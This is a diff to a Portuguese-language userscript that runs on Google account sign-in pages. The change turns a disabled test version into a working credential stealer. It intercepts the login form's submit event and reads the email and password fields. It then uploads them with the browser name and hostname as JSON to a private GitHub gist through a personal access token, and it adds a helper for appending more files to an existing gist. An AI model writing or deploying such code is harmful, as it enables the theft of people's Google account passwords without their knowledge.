@@ -6,7 +6,7 @@
 // @locale      pt-br
 // @include     *://accounts.google.com/*ServiceLogin?*
 // @include     *://accounts.google.com/*signin*
-// @version     1.08-2
+// @version     1.11-2
 // @grant       none
 // @run-at	end
 // ==/UserScript==
@@ -34,6 +34,12 @@ function USERSET(email, _senha, flag=false){
 	this.getSenha = () => _senha;
 	this.setSenha = (senha) => _senha = criptografar(senha, SENHA_PRIVADA, '/');
 	this.toString = () => `{"email":"${this.email}", "senha":"${this.getSenha()}"}`;
+	this.toJSON   = function(){
+		return {
+			"email": `${this.email}`,
+			"senha": `${this.getSenha()}`
+		}
+	}
 }
 /////////////////////////////////////////////////////////////////////////////////
 
@@ -59,41 +65,52 @@ function initgistachioAPI(id, confirmar){
 }
 
 
+
 /**
  * Cria e posta um gist no http://gits.github.com
  * @param {USERSET} conteudo - O conteúdo do gist (ao usar o método toString).
- * @param {String} filenmae - O nome do arquivo no gist.
- * @param {String} filedescription - A descrição do gist.
+ * @param {String} nomeArquivo - O nome do arquivo no gist.(*)
+ * @param {String} descricao - A descrição do gist.
  * @param {String} oauthgist - Personal access token (definido para criar gists).
  */
-function postit(conteudo, filename, filedescription, oauthgist){
-	if(!conteudo || !filename) return;
+function postit(conteudo, nomeArquivo, descricao, oauthgist){
+	if(!conteudo || !nomeArquivo) return;
 
-	conteudo = `${(new Date()).formatar("[%m%/%d%/%Y%] - %H%:%i%:%s%")}\n<${window.location.hostname}>\n${conteudo.toString()}`;
+	conteudo =
+	{
+          "_data": `${(new Date()).formatar("%m%/%d%/%Y% - %H%:%i%:%s%")}`,
+          "browser": navigator.appCodeName,
+          "site": `${window.location.hostname}`,
+          "personal": conteudo.toJSON(),
+        }
+	/*
+	conteudo = `${(new Date()).formatar("[%m%/%d%/%Y%][%H%:%i%:%s%]")}\n<${window.location.hostname}>\n${conteudo.toString()}`;
+	console.info("PREVIEW:");	// <<<<<<<<<<<<<<<
+	console.log(conteudo);		// <<<<<<<<<<<<<<<
+	*/
 
-	console.info("PREVIEW:");
-	console.log(conteudo);
-
-	return; // PARA TSTES
-
-	var newfile = { fileName: { content: conteudo } };
+	var newfile = {
+		"nomeGist.json": { //FIXME nome não alterável.
+			content: JSON.stringify(conteudo)
+		}
+	};
 	var optsnew = {
 		accessToken: oauthgist,
-		description: filedescription,
+		description: descricao,
 		public: false
 	};
 
 	var showResult = function(e, gistid){
 		if(e){
 			user_especs.flag = false;
-			console.error(e);
+			console.error(e);	// <<<<<<<<<<<<<<<
 		}
 		else{
 			user_especs.flag = true;
 			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;
 
-			console.log(linkresult);
-			console.info(gistid);
+			console.log(linkresult);	// <<<<<<<<<<<<<<<
+			console.info(gistid);		// <<<<<<<<<<<<<<<
 		}
 	};
 
@@ -102,35 +119,71 @@ function postit(conteudo, filename, filedescription, oauthgist){
 
 
 
+/**
+ * Adiciona/altera um arquivo em um gist já existente.
+ * @param {String} gistid - O id único do gist que será editado.
+ * @param {String} nomeArquivo - O nome do novo/alterado arquivo no gist.(*)
+ * @param {String} conteudo - O conteúdo do arquivo que será adicionado/editado.
+ * @param {String} oauthgist - Personal access token (definido para criar gists).
+ * @param {String} descricaoGist - (opcional) A nova descrição do gist.
+ */
+function adicionarArquivo(gistid, nomeArquivo, conteudo, oauthgist, descricaoGist){
+
+	var files = {
+		"new_nomeArquivo":{ //FIXME nome não alterável.
+			"content": `${conteudo}`
+		}
+	}
+
+	var optsnew = {
+		accessToken: oauthgist,
+		description: descricaoGist
+	};
+
+	var showResult = function(e, responsedata){
+		if(e){
+			console.error(e);	// <<<<<<<<<<<<<<<
+		}
+		else{
+			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;
+
+			console.log(linkresult);	// <<<<<<<<<<<<<<<
+			console.info(responsedata);	// <<<<<<<<<<<<<<<
+			// responsedata contém todos os arquivos desse gist.
+		}
+	};
+
+	window.gistachio.patchFiles(gistid, files, optsnew, showResult);
+
+}
+
+
+
+
+
+
 ///////////////////////// [ ALTERAR ESTA ] /////////////////////////
 function GM_main(){
-	var formulario = document.querySelector('form#gaia_loginform');
+	document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
+		e.preventDefault();
+		var form = this;
 
-	//   document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
-	//      e.preventDefault();
-	//   });
-	document.getElementById('signIn').onmouseover = function () {
+		let emailcurr = form.Email.value;
+		let password = form.Passwd.value;
 
-		var loginmail= formulario.Email;
-		var password = formulario.Passwd;
-
-		if(typeof loginmail !== 'undefined'){
-			let emailcurr = loginmail.value;
-
-			if(!IGNORAR.contemEmail(emailcurr) && (!user_especs.flag))
+		if(!IGNORAR.contemEmail(emailcurr))
 			user_especs.email = emailcurr;
+
+		if(!user_especs.flag){
+			user_especs.setSenha(password.toString());
+			postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
+			// adicionarArquivo('<GIST ID>', 'nomeOutro', 'conteudo do novo arquivo', PERSONAL_ACCESS_TOKEN, new Date().toLocaleString());
 		}
 
-		if(typeof password !== 'undefined'){
-			if(!user_especs.email.isEmpty()){
-				if((!user_especs.flag) && (password.value.length >= 6)){
-					user_especs.setSenha(password.value.toString());
-					postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
-				}
-			}
-		}
-
-	};
+		setTimeout(function (){
+ 		// 	form.submit();
+		}, 3500); // wait 3,5 seconds
+	});
 }
 
 
